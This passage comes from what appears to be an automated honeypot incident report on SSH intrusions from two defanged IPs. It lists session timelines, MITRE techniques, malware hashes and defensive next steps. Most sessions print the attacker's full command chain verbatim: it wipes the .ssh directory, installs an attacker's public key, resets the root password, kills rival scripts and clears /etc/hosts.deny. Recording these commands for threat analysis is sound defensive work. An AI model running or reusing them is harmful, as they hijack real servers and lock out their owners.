| `2026-04-05 21:58:53` | `cowrie.log.closed` |
| `2026-04-05 21:58:53` | `cowrie.session.params` |
| `2026-04-05 21:58:53` | `cowrie.command.input` |
| `2026-04-05 21:58:53` | `cowrie.log.closed` |
| `2026-04-05 21:58:53` | `cowrie.session.params` |
| `2026-04-05 21:58:53` | `cowrie.command.input` |
| `2026-04-05 21:58:54` | `cowrie.session.file_download` |
| `2026-04-05 21:58:54` | `cowrie.log.closed` |
| `2026-04-05 21:58:54` | `cowrie.session.params` |
| `2026-04-05 21:58:54` | `cowrie.command.input` |
| `2026-04-05 21:58:54` | `cowrie.log.closed` |
| `2026-04-05 21:58:54` | `cowrie.session.params` |
| `2026-04-05 21:58:54` | `cowrie.command.input` |
| `2026-04-05 21:58:54` | `cowrie.log.closed` |
| `2026-04-05 21:58:55` | `cowrie.session.params` |
| `2026-04-05 21:58:55` | `cowrie.command.input` |
| `2026-04-05 21:58:55` | `cowrie.command.input` |
| `2026-04-05 21:58:55` | `cowrie.log.closed` |
| `2026-04-05 21:58:55` | `cowrie.session.params` |
| `2026-04-05 21:58:55` | `cowrie.command.input` |
| `2026-04-05 21:58:55` | `cowrie.log.closed` |
| `2026-04-05 21:58:55` | `cowrie.session.params` |
| `2026-04-05 21:58:55` | `cowrie.command.input` |
| `2026-04-05 21:58:56` | `cowrie.log.closed` |
| `2026-04-05 21:58:56` | `cowrie.session.params` |
| `2026-04-05 21:58:56` | `cowrie.command.input` |
| `2026-04-05 21:58:56` | `cowrie.log.closed` |
| `2026-04-05 21:58:56` | `cowrie.session.params` |
| `2026-04-05 21:58:56` | `cowrie.command.input` |
| `2026-04-05 21:58:56` | `cowrie.log.closed` |
| `2026-04-05 21:58:57` | `cowrie.session.params` |
| `2026-04-05 21:58:57` | `cowrie.command.input` |
| `2026-04-05 21:58:57` | `cowrie.log.closed` |
| `2026-04-05 21:58:57` | `cowrie.session.params` |
| `2026-04-05 21:58:57` | `cowrie.command.input` |
| `2026-04-05 21:58:57` | `cowrie.log.closed` |
| `2026-04-05 21:58:57` | `cowrie.session.params` |
| `2026-04-05 21:58:57` | `cowrie.command.input` |
| `2026-04-05 21:58:57` | `cowrie.log.closed` |
| `2026-04-05 21:58:58` | `cowrie.session.params` |
| `2026-04-05 21:58:58` | `cowrie.command.input` |
| `2026-04-05 21:58:58` | `cowrie.log.closed` |
| `2026-04-05 21:58:58` | `cowrie.session.params` |
| `2026-04-05 21:58:58` | `cowrie.command.input` |
| `2026-04-05 21:58:58` | `cowrie.log.closed` |
| `2026-04-05 21:58:59` | `cowrie.session.params` |
| `2026-04-05 21:58:59` | `cowrie.command.input` |
| `2026-04-05 21:58:59` | `cowrie.log.closed` |
| `2026-04-05 21:58:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.45.150[.]82` to AbuseIPDB if not already reported
- [ ] Block `113.45.150[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f36246eaa659

| Field | Detail |
|---|---|
| **Source IP** | `113.45.150[.]82` |
| **First Seen** | 2026-04-05 22:07 |
| **Last Seen** | 2026-04-05 22:07 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:sfBwC7i0tTtj"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 22:07:01` | `cowrie.session.connect` |
| `2026-04-05 22:07:01` | `cowrie.client.version` |
| `2026-04-05 22:07:01` | `cowrie.client.kex` |
| `2026-04-05 22:07:02` | `cowrie.login.success` |
| `2026-04-05 22:07:02` | `cowrie.session.params` |
| `2026-04-05 22:07:02` | `cowrie.command.input` |
| `2026-04-05 22:07:02` | `cowrie.command.failed` |
| `2026-04-05 22:07:03` | `cowrie.log.closed` |
| `2026-04-05 22:07:03` | `cowrie.session.params` |
| `2026-04-05 22:07:03` | `cowrie.command.input` |
| `2026-04-05 22:07:03` | `cowrie.session.file_download` |
| `2026-04-05 22:07:03` | `cowrie.log.closed` |
| `2026-04-05 22:07:15` | `cowrie.session.params` |
| `2026-04-05 22:07:15` | `cowrie.command.input` |
| `2026-04-05 22:07:15` | `cowrie.log.closed` |
| `2026-04-05 22:07:16` | `cowrie.session.params` |
| `2026-04-05 22:07:16` | `cowrie.command.input` |
| `2026-04-05 22:07:16` | `cowrie.log.closed` |
| `2026-04-05 22:07:16` | `cowrie.session.params` |
| `2026-04-05 22:07:16` | `cowrie.command.input` |
| `2026-04-05 22:07:16` | `cowrie.session.file_download` |
| `2026-04-05 22:07:16` | `cowrie.log.closed` |
| `2026-04-05 22:07:17` | `cowrie.session.params` |
| `2026-04-05 22:07:17` | `cowrie.command.input` |
| `2026-04-05 22:07:17` | `cowrie.log.closed` |
| `2026-04-05 22:07:17` | `cowrie.session.params` |
| `2026-04-05 22:07:17` | `cowrie.command.input` |
| `2026-04-05 22:07:17` | `cowrie.log.closed` |
| `2026-04-05 22:07:18` | `cowrie.session.params` |
| `2026-04-05 22:07:18` | `cowrie.command.input` |
| `2026-04-05 22:07:18` | `cowrie.command.input` |
| `2026-04-05 22:07:18` | `cowrie.log.closed` |
| `2026-04-05 22:07:18` | `cowrie.session.params` |
| `2026-04-05 22:07:18` | `cowrie.command.input` |
| `2026-04-05 22:07:18` | `cowrie.log.closed` |
| `2026-04-05 22:07:18` | `cowrie.session.params` |
| `2026-04-05 22:07:18` | `cowrie.command.input` |
| `2026-04-05 22:07:19` | `cowrie.log.closed` |
| `2026-04-05 22:07:19` | `cowrie.session.params` |
| `2026-04-05 22:07:19` | `cowrie.command.input` |
| `2026-04-05 22:07:19` | `cowrie.log.closed` |
| `2026-04-05 22:07:19` | `cowrie.session.params` |
| `2026-04-05 22:07:19` | `cowrie.command.input` |
| `2026-04-05 22:07:20` | `cowrie.log.closed` |
| `2026-04-05 22:07:20` | `cowrie.session.params` |
| `2026-04-05 22:07:20` | `cowrie.command.input` |
| `2026-04-05 22:07:20` | `cowrie.log.closed` |
| `2026-04-05 22:07:20` | `cowrie.session.params` |
| `2026-04-05 22:07:20` | `cowrie.command.input` |
| `2026-04-05 22:07:21` | `cowrie.log.closed` |
| `2026-04-05 22:07:21` | `cowrie.session.params` |
| `2026-04-05 22:07:21` | `cowrie.command.input` |
| `2026-04-05 22:07:21` | `cowrie.log.closed` |
| `2026-04-05 22:07:21` | `cowrie.session.params` |
| `2026-04-05 22:07:21` | `cowrie.command.input` |
| `2026-04-05 22:07:21` | `cowrie.log.closed` |
| `2026-04-05 22:07:22` | `cowrie.session.params` |
| `2026-04-05 22:07:22` | `cowrie.command.input` |
| `2026-04-05 22:07:22` | `cowrie.log.closed` |
| `2026-04-05 22:07:22` | `cowrie.session.params` |
| `2026-04-05 22:07:22` | `cowrie.command.input` |
| `2026-04-05 22:07:22` | `cowrie.log.closed` |
| `2026-04-05 22:07:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.45.150[.]82` to AbuseIPDB if not already reported
- [ ] Block `113.45.150[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f6c475472bb

| Field | Detail |
|---|---|
| **Source IP** | `113.45.150[.]82` |
| **First Seen** | 2026-04-05 22:16 |
| **Last Seen** | 2026-04-05 22:17 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:uwC4UZdRPvhU"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 22:16:40` | `cowrie.session.connect` |
| `2026-04-05 22:16:40` | `cowrie.client.version` |
| `2026-04-05 22:16:41` | `cowrie.client.kex` |
| `2026-04-05 22:16:41` | `cowrie.login.success` |
| `2026-04-05 22:16:41` | `cowrie.session.params` |
| `2026-04-05 22:16:41` | `cowrie.command.input` |
| `2026-04-05 22:16:41` | `cowrie.command.failed` |
| `2026-04-05 22:16:41` | `cowrie.log.closed` |
| `2026-04-05 22:16:42` | `cowrie.session.params` |
| `2026-04-05 22:16:42` | `cowrie.command.input` |
| `2026-04-05 22:16:42` | `cowrie.session.file_download` |
| `2026-04-05 22:16:42` | `cowrie.log.closed` |
| `2026-04-05 22:16:54` | `cowrie.session.params` |
| `2026-04-05 22:16:54` | `cowrie.command.input` |
| `2026-04-05 22:16:54` | `cowrie.log.closed` |
| `2026-04-05 22:16:54` | `cowrie.session.params` |
| `2026-04-05 22:16:54` | `cowrie.command.input` |
| `2026-04-05 22:16:54` | `cowrie.log.closed` |
| `2026-04-05 22:16:55` | `cowrie.session.params` |
| `2026-04-05 22:16:55` | `cowrie.command.input` |
| `2026-04-05 22:16:55` | `cowrie.session.file_download` |
| `2026-04-05 22:16:55` | `cowrie.log.closed` |
| `2026-04-05 22:16:55` | `cowrie.session.params` |
| `2026-04-05 22:16:55` | `cowrie.command.input` |
| `2026-04-05 22:16:55` | `cowrie.log.closed` |
| `2026-04-05 22:16:55` | `cowrie.session.params` |
| `2026-04-05 22:16:55` | `cowrie.command.input` |
| `2026-04-05 22:16:56` | `cowrie.log.closed` |
| `2026-04-05 22:16:56` | `cowrie.session.params` |
| `2026-04-05 22:16:56` | `cowrie.command.input` |
| `2026-04-05 22:16:56` | `cowrie.command.input` |
| `2026-04-05 22:16:56` | `cowrie.log.closed` |
| `2026-04-05 22:16:56` | `cowrie.session.params` |
| `2026-04-05 22:16:56` | `cowrie.command.input` |
| `2026-04-05 22:16:56` | `cowrie.log.closed` |
| `2026-04-05 22:16:57` | `cowrie.session.params` |
| `2026-04-05 22:16:57` | `cowrie.command.input` |
| `2026-04-05 22:16:57` | `cowrie.log.closed` |
| `2026-04-05 22:16:57` | `cowrie.session.params` |
| `2026-04-05 22:16:57` | `cowrie.command.input` |
| `2026-04-05 22:16:57` | `cowrie.log.closed` |
| `2026-04-05 22:16:57` | `cowrie.session.params` |
| `2026-04-05 22:16:57` | `cowrie.command.input` |
| `2026-04-05 22:16:58` | `cowrie.log.closed` |
| `2026-04-05 22:16:58` | `cowrie.session.params` |
| `2026-04-05 22:16:58` | `cowrie.command.input` |
| `2026-04-05 22:16:58` | `cowrie.log.closed` |
| `2026-04-05 22:16:58` | `cowrie.session.params` |
| `2026-04-05 22:16:58` | `cowrie.command.input` |
| `2026-04-05 22:16:58` | `cowrie.log.closed` |
| `2026-04-05 22:16:59` | `cowrie.session.params` |
| `2026-04-05 22:16:59` | `cowrie.command.input` |
| `2026-04-05 22:16:59` | `cowrie.log.closed` |
| `2026-04-05 22:16:59` | `cowrie.session.params` |
| `2026-04-05 22:16:59` | `cowrie.command.input` |
| `2026-04-05 22:16:59` | `cowrie.log.closed` |
| `2026-04-05 22:16:59` | `cowrie.session.params` |
| `2026-04-05 22:16:59` | `cowrie.command.input` |
| `2026-04-05 22:17:00` | `cowrie.log.closed` |
| `2026-04-05 22:17:00` | `cowrie.session.params` |
| `2026-04-05 22:17:00` | `cowrie.command.input` |
| `2026-04-05 22:17:00` | `cowrie.log.closed` |
| `2026-04-05 22:17:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.45.150[.]82` to AbuseIPDB if not already reported
- [ ] Block `113.45.150[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6a462113020

| Field | Detail |
|---|---|
| **Source IP** | `113.45.150[.]82` |
| **First Seen** | 2026-04-05 22:20 |
| **Last Seen** | 2026-04-05 22:20 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:G2JCINIccYdF"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 22:20:00` | `cowrie.session.connect` |
| `2026-04-05 22:20:00` | `cowrie.client.version` |
| `2026-04-05 22:20:00` | `cowrie.client.kex` |
| `2026-04-05 22:20:00` | `cowrie.login.success` |
| `2026-04-05 22:20:01` | `cowrie.session.params` |
| `2026-04-05 22:20:01` | `cowrie.command.input` |
| `2026-04-05 22:20:01` | `cowrie.command.failed` |
| `2026-04-05 22:20:01` | `cowrie.log.closed` |
| `2026-04-05 22:20:01` | `cowrie.session.params` |
| `2026-04-05 22:20:01` | `cowrie.command.input` |
| `2026-04-05 22:20:01` | `cowrie.session.file_download` |
| `2026-04-05 22:20:01` | `cowrie.log.closed` |
| `2026-04-05 22:20:09` | `cowrie.session.params` |
| `2026-04-05 22:20:09` | `cowrie.command.input` |
| `2026-04-05 22:20:09` | `cowrie.log.closed` |
| `2026-04-05 22:20:10` | `cowrie.session.params` |
| `2026-04-05 22:20:10` | `cowrie.command.input` |
| `2026-04-05 22:20:10` | `cowrie.log.closed` |
| `2026-04-05 22:20:10` | `cowrie.session.params` |
| `2026-04-05 22:20:10` | `cowrie.command.input` |
| `2026-04-05 22:20:10` | `cowrie.session.file_download` |
| `2026-04-05 22:20:10` | `cowrie.log.closed` |
| `2026-04-05 22:20:11` | `cowrie.session.params` |
| `2026-04-05 22:20:11` | `cowrie.command.input` |
| `2026-04-05 22:20:11` | `cowrie.log.closed` |
| `2026-04-05 22:20:11` | `cowrie.session.params` |
| `2026-04-05 22:20:11` | `cowrie.command.input` |
| `2026-04-05 22:20:11` | `cowrie.log.closed` |
| `2026-04-05 22:20:12` | `cowrie.session.params` |
| `2026-04-05 22:20:12` | `cowrie.command.input` |
| `2026-04-05 22:20:12` | `cowrie.command.input` |
| `2026-04-05 22:20:12` | `cowrie.log.closed` |
| `2026-04-05 22:20:12` | `cowrie.session.params` |
| `2026-04-05 22:20:12` | `cowrie.command.input` |
| `2026-04-05 22:20:12` | `cowrie.log.closed` |
| `2026-04-05 22:20:13` | `cowrie.session.params` |
| `2026-04-05 22:20:13` | `cowrie.command.input` |
| `2026-04-05 22:20:13` | `cowrie.log.closed` |
| `2026-04-05 22:20:13` | `cowrie.session.params` |
| `2026-04-05 22:20:13` | `cowrie.command.input` |
| `2026-04-05 22:20:13` | `cowrie.log.closed` |
| `2026-04-05 22:20:14` | `cowrie.session.params` |
| `2026-04-05 22:20:14` | `cowrie.command.input` |
| `2026-04-05 22:20:14` | `cowrie.log.closed` |
| `2026-04-05 22:20:14` | `cowrie.session.params` |
| `2026-04-05 22:20:14` | `cowrie.command.input` |
| `2026-04-05 22:20:14` | `cowrie.log.closed` |
| `2026-04-05 22:20:15` | `cowrie.session.params` |
| `2026-04-05 22:20:15` | `cowrie.command.input` |
| `2026-04-05 22:20:15` | `cowrie.log.closed` |
| `2026-04-05 22:20:15` | `cowrie.session.params` |
| `2026-04-05 22:20:15` | `cowrie.command.input` |
| `2026-04-05 22:20:15` | `cowrie.log.closed` |
| `2026-04-05 22:20:15` | `cowrie.session.params` |
| `2026-04-05 22:20:15` | `cowrie.command.input` |
| `2026-04-05 22:20:16` | `cowrie.log.closed` |
| `2026-04-05 22:20:16` | `cowrie.session.params` |
| `2026-04-05 22:20:16` | `cowrie.command.input` |
| `2026-04-05 22:20:16` | `cowrie.log.closed` |
| `2026-04-05 22:20:16` | `cowrie.session.params` |
| `2026-04-05 22:20:16` | `cowrie.command.input` |
| `2026-04-05 22:20:16` | `cowrie.log.closed` |
| `2026-04-05 22:20:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.45.150[.]82` to AbuseIPDB if not already reported
- [ ] Block `113.45.150[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae48f053da25

| Field | Detail |
|---|---|
| **Source IP** | `113.45.150[.]82` |
| **First Seen** | 2026-04-05 22:21 |
| **Last Seen** | 2026-04-05 22:22 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:HVnsD9ZPZ9ZC"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 22:21:41` | `cowrie.session.connect` |
| `2026-04-05 22:21:41` | `cowrie.client.version` |
| `2026-04-05 22:21:41` | `cowrie.client.kex` |
| `2026-04-05 22:21:41` | `cowrie.login.success` |
| `2026-04-05 22:21:42` | `cowrie.session.params` |
| `2026-04-05 22:21:42` | `cowrie.command.input` |
| `2026-04-05 22:21:42` | `cowrie.command.failed` |
| `2026-04-05 22:21:42` | `cowrie.log.closed` |
| `2026-04-05 22:21:42` | `cowrie.session.params` |
| `2026-04-05 22:21:42` | `cowrie.command.input` |
| `2026-04-05 22:21:42` | `cowrie.session.file_download` |
| `2026-04-05 22:21:42` | `cowrie.log.closed` |
| `2026-04-05 22:21:55` | `cowrie.session.params` |
| `2026-04-05 22:21:55` | `cowrie.command.input` |
| `2026-04-05 22:21:55` | `cowrie.log.closed` |
| `2026-04-05 22:21:55` | `cowrie.session.params` |
| `2026-04-05 22:21:55` | `cowrie.command.input` |
| `2026-04-05 22:21:55` | `cowrie.log.closed` |
| `2026-04-05 22:21:55` | `cowrie.session.params` |
| `2026-04-05 22:21:55` | `cowrie.command.input` |
| `2026-04-05 22:21:56` | `cowrie.session.file_download` |
| `2026-04-05 22:21:56` | `cowrie.log.closed` |
| `2026-04-05 22:21:56` | `cowrie.session.params` |
| `2026-04-05 22:21:56` | `cowrie.command.input` |
| `2026-04-05 22:21:56` | `cowrie.log.closed` |
| `2026-04-05 22:21:56` | `cowrie.session.params` |
| `2026-04-05 22:21:56` | `cowrie.command.input` |
| `2026-04-05 22:21:57` | `cowrie.log.closed` |
| `2026-04-05 22:21:57` | `cowrie.session.params` |
| `2026-04-05 22:21:57` | `cowrie.command.input` |
| `2026-04-05 22:21:57` | `cowrie.command.input` |
| `2026-04-05 22:21:57` | `cowrie.log.closed` |
| `2026-04-05 22:21:57` | `cowrie.session.params` |
| `2026-04-05 22:21:57` | `cowrie.command.input` |
| `2026-04-05 22:21:57` | `cowrie.log.closed` |
| `2026-04-05 22:21:58` | `cowrie.session.params` |
| `2026-04-05 22:21:58` | `cowrie.command.input` |
| `2026-04-05 22:21:58` | `cowrie.log.closed` |
| `2026-04-05 22:21:58` | `cowrie.session.params` |
| `2026-04-05 22:21:58` | `cowrie.command.input` |
| `2026-04-05 22:21:58` | `cowrie.log.closed` |
| `2026-04-05 22:21:59` | `cowrie.session.params` |
| `2026-04-05 22:21:59` | `cowrie.command.input` |
| `2026-04-05 22:21:59` | `cowrie.log.closed` |
| `2026-04-05 22:21:59` | `cowrie.session.params` |
| `2026-04-05 22:21:59` | `cowrie.command.input` |
| `2026-04-05 22:21:59` | `cowrie.log.closed` |
| `2026-04-05 22:22:00` | `cowrie.session.params` |
| `2026-04-05 22:22:00` | `cowrie.command.input` |
| `2026-04-05 22:22:00` | `cowrie.log.closed` |
| `2026-04-05 22:22:00` | `cowrie.session.params` |
| `2026-04-05 22:22:00` | `cowrie.command.input` |
| `2026-04-05 22:22:00` | `cowrie.log.closed` |
| `2026-04-05 22:22:01` | `cowrie.session.params` |
| `2026-04-05 22:22:01` | `cowrie.command.input` |
| `2026-04-05 22:22:01` | `cowrie.log.closed` |
| `2026-04-05 22:22:01` | `cowrie.session.params` |
| `2026-04-05 22:22:01` | `cowrie.command.input` |
| `2026-04-05 22:22:01` | `cowrie.log.closed` |
| `2026-04-05 22:22:01` | `cowrie.session.params` |
| `2026-04-05 22:22:01` | `cowrie.command.input` |
| `2026-04-05 22:22:02` | `cowrie.log.closed` |
| `2026-04-05 22:22:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.45.150[.]82` to AbuseIPDB if not already reported
- [ ] Block `113.45.150[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35e9dfdd9ea2

| Field | Detail |
|---|---|
| **Source IP** | `185.39.204[.]145` |
| **First Seen** | 2026-04-05 22:28 |
| **Last Seen** | 2026-04-05 22:28 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 22:28:31` | `cowrie.session.connect` |
| `2026-04-05 22:28:31` | `cowrie.client.version` |
| `2026-04-05 22:28:31` | `cowrie.client.kex` |
| `2026-04-05 22:28:32` | `cowrie.login.success` |
| `2026-04-05 22:28:32` | `cowrie.session.params` |
| `2026-04-05 22:28:32` | `cowrie.command.input` |
| `2026-04-05 22:28:32` | `cowrie.command.failed` |
| `2026-04-05 22:28:32` | `cowrie.log.closed` |
| `2026-04-05 22:28:33` | `cowrie.session.params` |
| `2026-04-05 22:28:33` | `cowrie.command.input` |
| `2026-04-05 22:28:33` | `cowrie.session.file_download` |
| `2026-04-05 22:28:33` | `cowrie.log.closed` |
| `2026-04-05 22:28:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.39.204[.]145` to AbuseIPDB if not already reported
- [ ] Block `185.39.204[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac8b9ed0d1cb

| Field | Detail |
|---|---|
| **Source IP** | `185.39.204[.]145` |
| **First Seen** | 2026-04-05 22:28 |
| **Last Seen** | 2026-04-05 22:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
